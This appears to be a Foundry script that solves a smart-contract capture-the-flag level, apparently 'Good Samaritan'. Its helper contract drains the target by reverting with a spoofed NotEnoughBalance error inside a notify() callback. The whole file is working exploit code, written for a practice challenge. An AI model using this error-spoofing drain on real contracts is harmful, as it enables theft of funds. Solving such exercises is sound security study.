
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address good_samaritan = vm.envAddress("GOODSAMARITAN_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        PoorGuy poorguy = new PoorGuy();
        poorguy.drain(good_samaritan);

        vm.stopBroadcast();
    }
}

contract PoorGuy {
    error NotEnoughBalance();

    function drain(address good_samaritan) external {
        good_samaritan.call(abi.encodeWithSignature("requestDonation()"));
    }

    function notify(uint256 amount) external{
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}